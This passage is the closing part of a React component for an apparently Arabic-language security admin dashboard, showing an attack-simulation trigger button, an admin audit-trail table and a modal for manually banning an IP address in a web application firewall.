                className="w-full bg-[#0a0f0f] text-xs text-[#00ff88] px-3.5 py-2.5 rounded-xl border border-[#1e2e2e] outline-none font-mono"
              />
            </div>
          </div>

          <div className="pt-2 flex justify-end">
            <button
              onClick={handleRunSimulation}
              disabled={isProcessing}
              className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-[#0ea5e9] to-[#00d4aa] hover:from-[#0284c7] hover:to-[#00b894] text-[#0a0f0f] font-bold text-xs shadow-lg shadow-[#0ea5e9]/20 hover:scale-[1.01] active:scale-[0.99] transition-all flex items-center gap-2 cursor-pointer disabled:opacity-50"
            >
              <Play className="w-4 h-4 fill-current" />
              <span>{isProcessing ? "جاري تشغيل الاختبار..." : "إطلاق محاكاة هجومية لاختبار الكاشف"}</span>
            </button>
          </div>
        </div>
      )}

      {/* SUB-TAB 4: ADMIN AUDIT TRAIL */}
      {subTab === "audit" && (
        <div className="glass-card p-5 rounded-2xl border border-[#1e2e2e] space-y-4">
          <div className="flex items-center gap-2">
            <FileText className="w-4 h-4 text-[#00d4aa]" />
            <h3 className="text-sm font-bold text-[#e8f5f5]">سجل تدقيق عمليات المشرفين (Admin Audit Trail)</h3>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-right text-xs">
              <thead>
                <tr className="border-b border-[#1e2e2e] text-[#88b0b0] font-bold">
                  <th className="pb-3 pr-2">المشرف</th>
                  <th className="pb-3">الإجراء المنفذ</th>
                  <th className="pb-3">المورد المتأثر</th>
                  <th className="pb-3">التوقيت</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#1e2e2e]/60 font-mono">
                {(data?.adminAuditLog || []).map((log) => (
                  <tr key={log.id} className="hover:bg-[#111a1a]/50 transition-colors">
                    <td className="py-3 pr-2 font-sans font-bold text-[#e8f5f5]">{log.adminEmail}</td>
                    <td className="py-3 text-[#00d4aa] font-sans font-bold">{log.action}</td>
                    <td className="py-3 text-[#88b0b0]">{log.resourceType}</td>
                    <td className="py-3 text-[#4a7070] text-[11px]">
                      {new Date(log.timestamp).toLocaleString("ar-EG", {
                        hour: "2-digit",
                        minute: "2-digit",
                        day: "numeric",
                        month: "short",
                      })}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* MODAL: MANUAL BAN IP */}
      {showBanModal && (
        <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="glass-card p-6 rounded-2xl border border-[#1e2e2e] bg-[#0d1414] max-w-md w-full space-y-4 shadow-2xl">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2 text-red-400 font-bold text-sm">
                <Ban className="w-4 h-4" />
                <span>حظر عنوان IP يدوياً في درع WAF</span>
              </div>
              <button
                onClick={() => setShowBanModal(false)}
                className="text-[#88b0b0] hover:text-[#e8f5f5] text-sm cursor-pointer"
              >
                ✕
              </button>
            </div>

            <div className="space-y-3">
              <div className="space-y-1">
                <label className="text-xs text-[#88b0b0] block">عنوان IP المراد حظره:</label>
                <input
                  type="text"
                  value={manualIp}
                  onChange={(e) => setManualIp(e.target.value)}
                  placeholder="مثال: 185.220.101.44"
                  className="w-full bg-[#111a1a] text-xs text-[#e8f5f5] px-3 py-2 rounded-xl border border-[#1e2e2e] outline-none font-mono focus:border-red-500"
                />
              </div>

              <div className="space-y-1">
                <label className="text-xs text-[#88b0b0] block">سبب الحظر:</label>
                <input
                  type="text"
                  value={manualReason}
                  onChange={(e) => setManualReason(e.target.value)}
                  placeholder="مثال: محاولة فحص مشبوهة أو سلوك هجومي"
                  className="w-full bg-[#111a1a] text-xs text-[#e8f5f5] px-3 py-2 rounded-xl border border-[#1e2e2e] outline-none text-right"
                />
              </div>
            </div>

            <div className="flex justify-end gap-2 pt-2">
              <button
                onClick={() => setShowBanModal(false)}
                className="px-4 py-2 rounded-xl bg-[#1e2e2e] hover:bg-[#253838] text-[#e8f5f5] text-xs font-bold cursor-pointer"
              >
                إلغاء
              </button>
              <button
                onClick={() => {
                  if (manualIp.trim()) {
                    handleBanIP(manualIp.trim(), manualReason.trim() || "Manual ban by admin");
                  }
                }}
                disabled={!manualIp.trim() || isProcessing}
                className="px-4 py-2 rounded-xl bg-red-500 hover:bg-red-600 text-white text-xs font-bold transition-all cursor-pointer disabled:opacity-50"
              >
                {isProcessing ? "جاري الحظر..." : "تأكيد الحظر الفوري"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
